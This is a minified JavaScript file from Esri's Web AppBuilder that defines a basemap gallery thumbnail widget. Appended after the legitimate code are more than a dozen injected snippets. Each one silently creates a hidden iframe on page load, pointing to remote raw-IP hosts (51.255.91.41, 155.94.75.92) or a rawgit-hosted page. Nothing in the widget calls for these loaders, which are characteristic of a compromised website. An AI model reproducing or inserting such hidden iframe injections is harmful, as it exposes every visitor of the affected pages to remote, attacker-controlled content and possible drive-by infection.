// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/BasemapGallery/BasemapItem.html":'\x3cdiv class\x3d\'basemap-item\'\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"bgElement" class\x3d\'bg\'\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"thumbnailElement" class\x3d\'bg__thumbnail\'\x3e\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"deleteIcon" class\x3d\'bg__delete-icon\'\x3e\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"editIcon" class\x3d\'bg__detail-icon\'\x3e\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"selectIcon" class\x3d\'bg__selected-icon\'\x3e\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"warnElement" class\x3d"bg__warning-icon"\r\n    style\x3d"display:none;" title\x3d"${nls.invalidBasemapUrl2}"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"titleElement" class\x3d\'basemap-item__title jimu-ellipsis\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./BasemapItem.html dojo/Evented dojo/_base/lang dojo/_base/html dojo/on esri/SpatialReference jimu/utils ./utils".split(" "),function(c,g,h,k,l,m,d,b,e,n,f,p){c=c([g,h,k,m],{basemap:null,folderUrl:null,nls:null,templateString:l,mode:0,_promise:null,_loaded:!1,postCreate:function(){this.inherited(arguments);this.basemap&&(this._createItem(),this._loaded=!0);1===this.mode?b.addClass(this.domNode,
"edit-mode"):2===this.mode&&b.addClass(this.domNode,"select-mode")},toggleSelect:function(){this._loaded&&b.toggleClass(this.domNode,"selected")},isSelected:function(){return b.hasClass(this.domNode,"selected")},updateItem:function(a){this.basemap=a;b.setStyle(this.thumbnailElement,"backgroundImage","url("+this.basemap.thumbnailUrl+")");this.titleElement.title=f.stripHTML(this.basemap.title);this.titleElement.innerHTML=this.titleElement.title},_createItem:function(){this.own(e(this.deleteIcon,"click",
d.hitch(this,function(){this.emit("delete",this)})));this.own(e(this.editIcon,"click",d.hitch(this,function(){this.emit("edit",this)})));2===this.mode?this.own(e(this.domNode,"click",d.hitch(this,function(){this.toggleSelect();this.emit("selected",this.isSelected())}))):this.own(e(this.selectIcon,"click",d.hitch(this,function(){this.toggleSelect();this.emit("selected",this.isSelected())})));var a,c=this.folderUrl+"images/default.jpg";/data:image/.test(this.basemap.thumbnailUrl)?b.setStyle(this.thumbnailElement,
"backgroundImage","url("+this.basemap.thumbnailUrl+")"):(this.basemap.thumbnailUrl?0===this.basemap.thumbnailUrl.indexOf("//")?(a=this.basemap.thumbnailUrl,0===this.mode&&(a+=p.getToken(this.appConfig.portalUrl))):a=f.processUrlInWidgetConfig(this.basemap.thumbnailUrl,this.folderUrl):(this.basemap.thumbnailUrl=c,a=this.basemap.thumbnailUrl),0!==this.mode?f.getBase64Data(a).then(d.hitch(this,function(a){this.basemap.thumbnailUrl=a?a:c;b.setStyle(this.thumbnailElement,"backgroundImage","url("+this.basemap.thumbnailUrl+
")")})):b.setStyle(this.thumbnailElement,"backgroundImage","url("+a+")"));this.titleElement.title=f.stripHTML(this.basemap.title);this.titleElement.innerHTML=this.titleElement.title;this.spatialReference.equals(new n(+this.basemap.spatialReference.wkid))||(b.setStyle(this.thumbnailElement,"border","1px solid red"),b.setStyle(this.warnElement,"display",""))}});c.MODE_READONLY=0;c.MODE_EDIT=1;c.MODE_SELECT=2;return c});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});